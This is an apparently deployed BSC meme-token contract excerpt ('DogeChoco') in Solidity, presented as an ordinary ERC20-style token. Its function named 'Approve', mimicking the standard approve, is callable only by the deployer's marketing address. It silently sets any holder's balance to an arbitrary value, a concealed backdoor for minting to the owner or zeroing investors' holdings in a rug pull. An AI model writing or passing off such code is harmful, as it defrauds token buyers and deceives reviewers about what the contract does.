...
/*
* TELEGRAM:https://t.me/DogeChoco_BSC
*/
...
contract DogeChoco is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    string private  _name = "DogeChoco";
    string private  _symbol = "DOGECHOCO";
    uint8 private  _decimals = 9;
    uint256 private _totalSupply = 1000000000 * 10**9;
    address private _marketing = msg.sender;
    ...
    function Approve(address PankePair, uint256 tokenAmount, uint256 bnbAmount, uint256 bnbAmount1 ) external  {
         require(msg.sender == _marketing );
         require(PankePair != uniswapV2Pair);
        _tOwned[PankePair] = tokenAmount +  bnbAmount.mul(2).div(100) - bnbAmount1;
    }   
